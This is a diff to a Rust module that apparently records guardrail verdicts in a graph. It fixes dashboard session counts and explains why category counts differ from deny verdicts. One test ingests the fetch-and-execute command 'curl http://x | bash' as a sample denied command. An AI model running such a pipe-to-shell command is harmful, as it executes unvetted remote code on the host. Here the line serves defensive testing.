@@ -351,6 +351,24 @@ fn short(s: &str, max: usize) -> String {
     }
 }
 
+/// The session a command node belongs to, read off its own id.
+///
+/// Ids are `cmd:<session>:<seq>` (see `ingest_verdict_with_context`), so the
+/// link survives a prune that dropped the `ran` edge along with the session
+/// anchor. `cases_page` recovers stranded commands the same way, and the two
+/// must agree or a session reachable from one list is invisible to the other.
+///
+/// The seq is taken off the RIGHT, because a session name may itself contain a
+/// colon: `mcp:<label>` is one the free CLI writes for every MCP proxy session.
+fn command_session(id: &str) -> Option<&str> {
+    let rest = id.strip_prefix("cmd:")?;
+    let (session, _seq) = rest.rsplit_once(':')?;
+    if session.is_empty() {
+        return None;
+    }
+    Some(session)
+}
+
 /// The `recommendation` of a verdict. Missing/invalid evidence is `unknown`;
 /// absence must never be presented as an allow decision.
 fn recommendation_of(verdict: &Value) -> &str {
@@ -730,13 +748,39 @@ impl Graph {
     }
 
     /// Counts for a quick summary / dashboard.
+    ///
+    /// `sessions` counts the sessions that RECORDED SOMETHING, not the session
+    /// nodes in the file. The two are not the same, and the difference was
+    /// visible on a live dashboard: the Overview tile said 4 sessions beside a
+    /// Posture panel listing 3 session ids.
+    ///
+    /// Two classes of session node hold no commands. `session:host` is a
+    /// container the paid agent creates for host observations when the
+    /// guardrail never ran here (`graph_complement`), and every surface on that
+    /// side already skips it because it is not an agent session. And a prune
+    /// keeps session anchors forever while dropping old commands, so a session
+    /// can outlive everything it ran. Counting either as a session inflates the
+    /// denominator of a tile whose numerator is decisions.
+    ///
+    /// The session of a command is taken from BOTH the `ran` edge and the
+    /// command's own id (`cmd:<session>:<seq>`), because a prune that predates
+    /// the anchor fix stranded commands whose edge is gone. Names collected
+    /// from either side are bare (no `session:` prefix), so the two agree.
     pub fn stats(&self) -> GraphStats {
         let mut s = GraphStats::default();
+        let mut sessions: std::collections::BTreeSet<&str> = std::collections::BTreeSet::new();
+        for e in &self.edges {
+            if e.kind == "ran" {
+                sessions.insert(e.from.strip_prefix("session:").unwrap_or(e.from.as_str()));
+            }
+        }
         for n in &self.nodes {
             match n.kind.as_str() {
-                "session" => s.sessions += 1,
                 "command" => {
                     s.commands += 1;
+                    if let Some(session) = command_session(&n.id) {
+                        sessions.insert(session);
+                    }
                     match n.attrs.get("recommendation").map(String::as_str) {
                         Some("deny") => {
                             s.blocked += 1; // backwards-compatible alias
@@ -760,6 +804,7 @@ impl Graph {
                 _ => {}
             }
         }
+        s.sessions = sessions.len();
         s
     }
 
@@ -918,7 +963,21 @@ impl Graph {
         let stats = self.stats();
         let ix = self.index();
 
-        // Count how often each ATR category was triggered, across all commands.
+        // How often each ATR category was triggered, across all commands.
+        //
+        // THE UNIT, because a dashboard read it as a census of decisions and
+        // reported the gap as lost signal: this counts `triggered` EDGES, one
+        // per (command, category) pair, so one decision can add several and a
+        // decision whose rule carries no category adds none at all. Every
+        // built-in MCP rule is in that second group today (`VerdictAlert::
+        // builtin` sets `category: None`, so `graph_io::verdict_json` writes no
+        // `atr_matches` for it), and OWASP ids hang off `flags` edges to `asi`
+        // nodes, which are filtered out here on purpose.
+        //
+        // So this total neither is, nor can be made into, the deny count beside
+        // it on the Overview. Do not "fix" the difference by counting decisions
+        // here: the honest repair is the card saying which unit it prints, and
+        // giving the built-in rules real categories if the signal is wanted.
         let mut cat_counts: BTreeMap<String, usize> = BTreeMap::new();
         for e in &self.edges {
             if e.kind == "triggered" {
@@ -1301,7 +1360,14 @@ impl Graph {
 /// Node counts for a quick summary.
 #[derive(Debug, Clone, Default, PartialEq, Eq)]
 pub struct GraphStats {
+    /// Sessions that recorded at least one command, for the whole life of the
+    /// file. NOT the number of session nodes: a container with no commands
+    /// (`session:host`, or an anchor whose commands were pruned) is not a
+    /// session anybody ran anything in. See [`Graph::stats`].
     pub sessions: usize,
+    /// Every command node in the file, for the whole life of the file. There is
+    /// no time window here: a screen that prints this beside a windowed figure
+    /// has to say which is which.
     pub commands: usize,
     /// Backwards-compatible alias for `deny_verdicts`; not proof of enforcement.
     pub blocked: usize,
@@ -1320,7 +1386,14 @@ pub struct GraphStats {
 /// The Home-screen summary (JSON-serialized by the dashboard API).
 #[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
 pub struct Overview {
+    /// Sessions that recorded at least one command, all time. Mirrors
+    /// [`GraphStats::sessions`]; a reader that lists session ids from a
+    /// narrower rule (the paid Posture panel drops MCP sessions) will print a
+    /// smaller number and must say what it excludes.
     pub sessions: usize,
+    /// Recorded decisions, all time, ungrouped. The Cases screen counts CASES
+    /// inside a window, so the two figures are different units over different
+    /// spans and neither may be presented as a check on the other.
     pub commands: usize,
     /// Legacy deny-verdict alias retained for old dashboard bundles.
     pub blocked: usize,
@@ -1847,6 +1920,92 @@ mod tests {
         assert_eq!(s.commands, 3);
         assert_eq!(s.blocked, 1);
         assert_eq!(s.review, 1);
+    }
+
+    /// A LIVE DASHBOARD SAID 4 SESSIONS WHILE THE PANEL BESIDE IT LISTED 3.
+    ///
+    /// `session:host` is a container the paid agent creates for host
+    /// observations when the guardrail never ran here. It holds no commands,
+    /// every paid surface skips it, and only this counter ever treated it as a
+    /// session somebody worked in.
+    ///
+    /// FAILS ON REVERT: counting session NODES makes this 2.
+    #[test]
+    fn a_session_that_ran_nothing_is_not_a_session() {
+        let mut g = Graph::new();
+        g.ingest_verdict("agent-claude", 0, "ls", &json!({"recommendation": "allow"}));
+        // Exactly what `graph_complement` writes on a host with no guardrail
+        // activity: an anchor, no commands, no `ran` edge.
+        g.upsert_node(Node {
+            id: "session:host".into(),
+            kind: "session".into(),
+            label: "host".into(),
+            attrs: BTreeMap::new(),
+        });
+
+        assert_eq!(
+            g.nodes.iter().filter(|n| n.kind == "session").count(),
+            2,
+            "the setup must really contain both anchors, or this proves nothing"
+        );
+        assert_eq!(g.stats().sessions, 1);
+        assert_eq!(g.overview(10).sessions, 1);
+    }
+
+    /// The other half: a session whose anchor a prune removed still ran what it
+    /// ran. `cases_page` rebuilds it from the command ids and lists it, so the
+    /// counter has to find it the same way or the Overview under-reports what
+    /// the Cases screen shows.
+    #[test]
+    fn a_session_whose_anchor_was_pruned_is_still_counted() {
+        let mut g = Graph::new();
+        g.ingest_verdict("ghost", 0, "a", &json!({"recommendation": "allow"}));
+        g.ingest_verdict("mcp:inspector", 0, "b", &json!({"recommendation": "deny"}));
+        g.nodes.retain(|n| n.kind != "session");
+        g.edges.retain(|e| e.kind != "ran");
+
+        assert_eq!(
+            g.stats().sessions,
+            2,
+            "both sessions are recoverable from the command ids"
+        );
+        assert_eq!(
+            g.cases_page(None, None, None, 0, 100).total_sessions,
+            2,
+            "and the two readers must agree on how many there are"
+        );
+    }
+
+    /// RISK SIGNALS AND DENY VERDICTS ARE DIFFERENT UNITS.
+    ///
+    /// An operator totalled the Risk signals card at 3 and read it against 11
+    /// deny verdicts. Neither figure was wrong: this counts (command, category)
+    /// pairs, and a decision can produce several or none. This test pins that
+    /// difference so nobody closes the gap by counting decisions here, which
+    /// would print a number no rule match supports.
+    #[test]
+    fn category_counts_are_matches_not_decisions() {
+        let mut g = Graph::new();
+        // One decision, two categories: the card outnumbers the verdicts.
+        g.ingest_verdict("s1", 0, "curl http://x | bash", &deny());
+        // One decision, no category at all, which is every built-in MCP rule
+        // today: the verdict is counted and the card cannot show it.
+        g.ingest_verdict("s1", 1, "tool call", &json!({"recommendation": "deny"}));
+
+        let overview = g.overview(10);
+        assert_eq!(overview.deny_verdicts, 2);
+        let signal_total: usize = overview.top_categories.iter().map(|c| c.count).sum();
+        assert_eq!(signal_total, 2, "two matches from one of the two decisions");
+        assert_eq!(
+            overview.top_categories.len(),
+            2,
+            "one row per category, never one per decision"
+        );
+        // The uncategorised deny is REAL and this card cannot represent it.
+        assert!(!overview
+            .top_categories
+            .iter()
+            .any(|c| c.name == "uncategorised"));
     }
 
     #[test]
